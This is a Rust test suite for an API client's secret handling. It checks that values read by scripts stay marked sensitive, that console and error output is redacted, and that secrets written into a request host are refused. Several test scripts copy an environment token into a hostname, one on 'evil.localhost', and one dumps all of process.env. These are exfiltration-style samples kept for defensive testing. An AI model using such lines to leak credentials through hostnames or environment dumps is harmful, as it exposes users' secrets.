//! Secrets a script reads stay sensitive when it copies them into a request or a variable,
//! and debug output never quotes them.

use crate::script_support;

use crate::common::dead_port;
use apinata_core::{
    CancelHandle, Collection, ContextOptions, ExecError, ExecOptions, Executor, ResolvedRequest,
    RunError, RunOptions, VarContext, run,
};
use script_support::*;
use std::sync::{Arc, Mutex};
use wiremock::matchers::any;
use wiremock::{Mock, MockServer, ResponseTemplate};

const SECRET: &str = "S3cret-tok-77";

fn secret_ctx() -> ContextOptions {
    ContextOptions::new().sensitive_env_var("tok", SECRET)
}

/// Each guarded request's URL path with its sensitive values.
type Log = Arc<Mutex<Vec<(String, Vec<String>)>>>;

/// Run options whose guard records each request's sensitive values by URL path.
fn recording() -> (RunOptions, Log) {
    let log: Log = Arc::default();
    let seen = Arc::clone(&log);
    let guard = Arc::new(move |req: &ResolvedRequest| {
        let path = url::Url::parse(req.url())
            .map(|u| u.path().to_owned())
            .unwrap_or_default();
        seen.lock()
            .unwrap()
            .push((path, req.sensitive_values().to_vec()));
        None
    });
    (on().guard(guard), log)
}

async fn ok() -> MockServer {
    let s = MockServer::start().await;
    Mock::given(any())
        .respond_with(ResponseTemplate::new(200))
        .mount(&s)
        .await;
    s
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_secret_a_script_copies_into_a_header_joins_the_sensitive_values() {
    let s = ok().await;
    let code = "req.setHeader('X-Copy', 'k=' + bru.getEnvVar('tok'))";
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "r.yml",
            &scripted(
                "R",
                &format!("{}/a", s.uri()),
                &script("before-request", code),
                "",
            ),
        ),
    ]);
    let (opts, log) = recording();
    send_full(dir.path(), "r.yml", opts, secret_ctx(), ExecOptions::new()).await;
    let log = log.lock().unwrap();
    assert!(
        log[0].1.contains(&SECRET.to_owned()),
        "{:?}",
        log[0].1.len()
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_secret_a_script_puts_in_the_host_is_refused_under_a_host_policy() {
    let code = "req.setUrl('http://' + bru.getEnvVar('tok') + '.localhost:9/')";
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "r.yml",
            &scripted(
                "R",
                "http://127.0.0.1:9/",
                &script("before-request", code),
                "",
            ),
        ),
    ]);
    let exec = ExecOptions::new().host_policy(Arc::new(|_: &str| false));
    let (result, _) = send_full(dir.path(), "r.yml", on(), secret_ctx(), exec).await;
    assert!(
        matches!(
            result.error,
            Some(RunError::Exec(ExecError::SecretInHost { .. }))
        ),
        "{:?}",
        result.error
    );
    let error = result.error.expect("refused");
    assert!(!error.to_string().contains(SECRET), "{error}");
    assert!(!format!("{error:?}").contains(SECRET));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_copied_secret_stays_sensitive_in_later_requests() {
    let s = ok().await;
    let copy = "bru.setVar('copy', 'v-' + bru.getEnvVar('tok'))";
    let b = format!(
        "info:\n  name: B\n  type: http\n  seq: 2\nhttp:\n  method: GET\n  url: \"{}/b\"\n  headers:\n    - name: X-B\n      value: \"{{{{copy}}}}\"\n",
        s.uri()
    );
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "a.yml",
            &scripted(
                "A",
                &format!("{}/a", s.uri()),
                &script("before-request", copy),
                "",
            ),
        ),
        ("b.yml", &b),
    ]);
    let c = Collection::open(dir.path()).unwrap();
    let ctx = VarContext::new(&c, secret_ctx()).unwrap();
    let plan = c.plan(dir.path()).unwrap();
    let exec = Arc::new(Executor::new(ExecOptions::new()).unwrap());
    let (opts, log) = recording();
    run(plan, ctx, exec, opts, CancelHandle::new(), Box::new(|_| {})).await;
    let log = log.lock().unwrap();
    let b = log.iter().find(|(p, _)| p == "/b").expect("b sent");
    assert!(
        b.1.contains(&SECRET.to_owned()),
        "b tracked {} values",
        b.1.len()
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn debug_output_never_quotes_a_secret_from_a_test_or_an_error() {
    let s = ok().await;
    let tests_code =
        "test('t ' + bru.getEnvVar('tok'), () => { throw new Error(bru.getEnvVar('tok')) })";
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "t.yml",
            &scripted(
                "T",
                &format!("{}/t", s.uri()),
                &script("tests", tests_code),
                "",
            ),
        ),
        (
            "p.yml",
            &scripted(
                "P",
                &format!("{}/p", s.uri()),
                &script("before-request", "throw new Error(bru.getEnvVar('tok'))"),
                "",
            ),
        ),
    ]);
    let (t, _) = send_full(dir.path(), "t.yml", on(), secret_ctx(), ExecOptions::new()).await;
    assert!(t.tests[0].name.contains(SECRET));
    assert!(!format!("{:?}", t.tests).contains(SECRET));
    let (p, _) = send_full(dir.path(), "p.yml", on(), secret_ctx(), ExecOptions::new()).await;
    let error = p.error.expect("script error");
    assert!(error.to_string().contains(SECRET));
    assert!(!format!("{error:?}").contains(SECRET));
}

/// Sends `url` with a pre-request `code` under a host policy that refuses every host, with
/// `tok` holding `secret`.
async fn refused_send(url: &str, code: &str, secret: &str) -> Option<RunError> {
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "r.yml",
            &scripted("R", url, &script("before-request", code), ""),
        ),
    ]);
    let exec = ExecOptions::new().host_policy(Arc::new(|_: &str| false));
    let ctx = ContextOptions::new().sensitive_env_var("tok", secret);
    let (result, _) = send_full(dir.path(), "r.yml", on(), ctx, exec).await;
    result.error
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_non_ascii_secret_a_script_puts_in_the_host_is_refused() {
    let code = "req.setUrl('http://' + bru.getEnvVar('tok') + '.localhost:9/')";
    let error = refused_send("http://127.0.0.1:9/", code, "s\u{e9}cret").await;
    assert!(
        matches!(error, Some(RunError::Exec(ExecError::SecretInHost { .. }))),
        "{error:?}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_secret_inside_the_written_host_is_judged_once_a_script_changes_the_host() {
    let code = "req.setUrl('http://' + bru.getEnvVar('tok') + '.evil.localhost:9/')";
    let error = refused_send("http://tenant-api.localhost:9/", code, "tenant").await;
    assert!(
        matches!(error, Some(RunError::Exec(ExecError::SecretInHost { .. }))),
        "{error:?}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_refused_host_never_quotes_a_secret_in_another_case() {
    let code = "req.setUrl('http://' + bru.getEnvVar('tok').toUpperCase() + '.localhost:9/')";
    let error = refused_send("http://127.0.0.1:9/", code, "s3cret-low").await;
    assert!(
        matches!(error, Some(RunError::Exec(ExecError::SecretInHost { .. }))),
        "{error:?}"
    );
    let error = error.expect("refused");
    assert!(
        !error.to_string().to_lowercase().contains("s3cret-low"),
        "{error}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_non_ascii_secret_inside_a_host_label_is_refused() {
    let code = "req.setUrl('http://x' + bru.getEnvVar('tok') + '-api.localhost:9/')";
    let error = refused_send("http://127.0.0.1:9/", code, "s\u{e9}cret").await;
    assert!(
        matches!(error, Some(RunError::Exec(ExecError::SecretInHost { .. }))),
        "{error:?}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_non_ascii_secret_spanning_host_and_port_is_refused() {
    let code = "req.setUrl('http://' + bru.getEnvVar('tok') + '/')";
    let error = refused_send("http://127.0.0.1:9/", code, "s\u{e9}cret.localhost:9").await;
    assert!(
        matches!(error, Some(RunError::Exec(ExecError::SecretInHost { .. }))),
        "{error:?}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_secret_read_while_the_written_host_is_unchanged_still_sends() {
    let code = "bru.getEnvVar('tok')";
    let error = refused_send("http://tenant-api.localhost:9/", code, "tenant").await;
    assert!(
        matches!(error, Some(RunError::Exec(ExecError::Connect { .. }))),
        "{error:?}"
    );
}

const PROCESS_VALUE: &str = "Pk-env-4471";

/// A request whose post-response variable evaluates `expression` as JavaScript, sent with
/// scripts on and `API_KEY` in the process environment.
async fn process_env_send(expression: &str) -> Vec<String> {
    let s = ok().await;
    let actions = format!(
        "  actions:\n    - type: set-variable\n      phase: after-response\n      selector:\n        expression: \"{expression}\"\n        method: jsonq\n      variable:\n        name: v\n        scope: runtime\n"
    );
    let request = format!(
        "info:\n  name: R\n  type: http\n  seq: 1\nhttp:\n  method: GET\n  url: \"{}/a\"\nruntime:\n{actions}",
        s.uri()
    );
    let dir = write_tree(&[("opencollection.yml", ROOT), ("r.yml", &request)]);
    let ctx = ContextOptions::new().process_env([("API_KEY", PROCESS_VALUE)]);
    let (result, _) = send_full(dir.path(), "r.yml", on(), ctx, ExecOptions::new()).await;
    assert!(result.error.is_none(), "{:?}", result.error);
    result.script_sensitive_values().to_vec()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_unread_process_env_value_is_not_sensitive() {
    let sensitive = process_env_send("res.status + 1").await;
    assert!(!sensitive.contains(&PROCESS_VALUE.to_owned()));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_process_env_value_an_expression_reads_is_sensitive() {
    let sensitive = process_env_send("'k=' + process.env.API_KEY").await;
    assert!(sensitive.contains(&PROCESS_VALUE.to_owned()));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_process_env_value_an_expression_enumerates_is_sensitive() {
    let sensitive = process_env_send("JSON.stringify(Object.getOwnPropertyDescriptors(process.env)) + Object.values(process.env).join()").await;
    assert!(sensitive.contains(&PROCESS_VALUE.to_owned()));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_secret_in_a_nested_url_stays_sensitive_for_the_caller() {
    let s = ok().await;
    // A port that refuses every connection, so that send fails without a response.
    let closed = dead_port();
    let plain = |name: &str, url: String| {
        format!(
            "info:\n  name: {name}\n  type: http\n  seq: 1\nhttp:\n  method: GET\n  url: \"{url}\"\n"
        )
    };
    let code = "for (const n of ['down', 'up']) {\n  const r = await bru.runRequest(n);\n  console.log(String(r.error), String(r.url));\n}";
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "down.yml",
            &plain("D", format!("http://127.0.0.1:{closed}/{{{{tok}}}}")),
        ),
        ("up.yml", &plain("U", format!("{}/{{{{tok}}}}", s.uri()))),
        (
            "r.yml",
            &scripted(
                "R",
                &format!("{}/r", s.uri()),
                &script("before-request", code),
                "",
            ),
        ),
    ]);
    let (result, _) = send_full(dir.path(), "r.yml", on(), secret_ctx(), ExecOptions::new()).await;
    let logged = console(&result);
    // Both results quote the secret: the failed send in its error, the answered one in its URL.
    assert_eq!(logged.len(), 2, "{logged:?}");
    assert!(logged.iter().all(|l| l.contains(SECRET)), "{logged:?}");
    assert!(
        result
            .script_sensitive_values()
            .contains(&SECRET.to_owned()),
        "{:?}",
        result.script_sensitive_values().len()
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_redacted_console_and_text_hide_a_secret_the_raw_console_keeps() {
    let s = ok().await;
    let code = "console.log('tok', bru.getEnvVar('tok'))\nconsole.log('plain')\nthrow new Error(bru.getEnvVar('tok'))";
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "r.yml",
            &scripted(
                "R",
                &format!("{}/r", s.uri()),
                &script("before-request", code),
                "",
            ),
        ),
    ]);
    let (r, _) = send_full(dir.path(), "r.yml", on(), secret_ctx(), ExecOptions::new()).await;
    assert_eq!(r.console[0].text, format!("tok {SECRET}"));
    let shown: Vec<String> = r.redacted_console().into_iter().map(|c| c.text).collect();
    // The thrown error's console line is redacted like the lines the script logged.
    assert_eq!(
        shown,
        [
            "tok [redacted]",
            "plain",
            "this request's script, line 3: Error: [redacted]"
        ]
    );
    let error = r.error.as_ref().expect("script error").to_string();
    assert!(error.contains(SECRET));
    assert!(!r.redact(&error).contains(SECRET));
}

#[tokio::test]
async fn a_substituted_os_value_in_a_refused_url_is_redacted_in_the_result() {
    // The host comes from the OS process environment (injected, never the real one), and
    // port 1 on loopback refuses, so the error quotes the substituted URL.
    const HOST: &str = "127.0.0.1";
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        (
            "r.yml",
            "info:\n  name: R\n  type: http\nhttp:\n  method: GET\n  url: \"http://{{process.env.HOST}}:1/\"\n",
        ),
    ]);
    let ctx = ContextOptions::new().process_env([("HOST", HOST)]);
    let (r, _) = send_full(
        dir.path(),
        "r.yml",
        RunOptions::new(),
        ctx,
        ExecOptions::new(),
    )
    .await;
    let error = r.error.as_ref().expect("the send is refused").to_string();
    assert!(error.contains(HOST), "the error quotes the URL: {error}");
    assert!(!r.redact(&error).contains(HOST), "{}", r.redact(&error));
}
